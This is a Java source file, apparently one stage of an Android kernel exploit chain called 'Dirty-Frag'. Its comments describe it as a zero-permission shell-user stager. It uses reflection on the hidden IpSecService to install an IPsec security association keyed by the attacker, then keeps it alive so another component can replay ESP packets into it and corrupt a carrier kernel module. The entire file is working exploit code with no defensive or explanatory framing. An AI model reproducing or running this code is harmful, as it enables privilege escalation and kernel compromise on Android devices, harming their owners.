package q3;

import android.os.Binder;
import java.lang.reflect.*;

/**
 * Dirty-Frag SA stager (uid 2000, zero perms). Installs an attacker-keyed AES-GCM ESP SA
 * (spi 0xDEADBE10, transport, UDP-encap) via IpSecService and STAYS ALIVE so the libeva-ctor
 * stub running in hal_tracking can replay ESP packets into it to poison the carrier .ko.
 * Prints "ENCAPPORT=<port>" then sleeps. Must run in a persistent shell (nohup dies -> SA reaped).
 */
public class Stager {
    static Object svc;
    static Class<?> C(String n) throws Exception { return Class.forName(n); }
    static Object call(String n, Class<?>[] s, Object... a) throws Exception {
        try { return C("android.net.IIpSecService").getMethod(n, s).invoke(svc, a); }
        catch (InvocationTargetException e) { throw new RuntimeException(n + " -> " + e.getCause()); }
    }
    static int fi(Object o, String f) throws Exception {
        Field x = o.getClass().getDeclaredField(f); x.setAccessible(true); return x.getInt(o);
    }

    public static void main(String[] a) throws Exception {
        byte[] KEYMAT = new byte[20];
        for (int i = 0; i < 20; i++) KEYMAT[i] = (byte) (0x41 + i);
        int SPI = 0xDEADBE10;
        int seconds = a.length > 0 ? Integer.parseInt(a[0]) : 600;

        Object b = C("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "ipsec");
        svc = C("android.net.IIpSecService$Stub").getMethod("asInterface", C("android.os.IBinder")).invoke(null, b);
        Class<?> IB = C("android.os.IBinder");
        Object tok = new Binder();
        Object enc = call("openUdpEncapsulationSocket", new Class<?>[]{int.class, IB}, 0, tok);
        int encRid = fi(enc, "resourceId"), port = fi(enc, "port");
        Object spiR = call("allocateSecurityParameterIndex", new Class<?>[]{String.class, int.class, IB},
                "127.0.0.1", SPI, tok);
        int spiRid = fi(spiR, "resourceId"), spi = fi(spiR, "spi");
        Object alg = C("android.net.IpSecAlgorithm").getConstructor(String.class, byte[].class, int.class)
                .newInstance("rfc4106(gcm(aes))", KEYMAT, 128);
        Class<?> cfgC = C("android.net.IpSecConfig");
        Object cfg = cfgC.getDeclaredConstructor().newInstance();
        cfgC.getMethod("setMode", int.class).invoke(cfg, 0);
        cfgC.getMethod("setSourceAddress", String.class).invoke(cfg, "127.0.0.1");
        cfgC.getMethod("setDestinationAddress", String.class).invoke(cfg, "127.0.0.1");
        cfgC.getMethod("setSpiResourceId", int.class).invoke(cfg, spiRid);
        cfgC.getMethod("setEncapType", int.class).invoke(cfg, 2);
        cfgC.getMethod("setEncapSocketResourceId", int.class).invoke(cfg, encRid);
        cfgC.getMethod("setEncapRemotePort", int.class).invoke(cfg, port);
        cfgC.getMethod("setAuthenticatedEncryption", C("android.net.IpSecAlgorithm")).invoke(cfg, alg);
        Object tr = call("createTransform", new Class<?>[]{cfgC, IB, String.class}, cfg, tok, "com.android.shell");
        System.out.println("SA status=" + fi(tr, "status") + " spi=0x" + Integer.toHexString(spi));
        System.out.println("ENCAPPORT=" + port);
        System.out.flush();
        Thread.sleep(seconds * 1000L);
    }
}
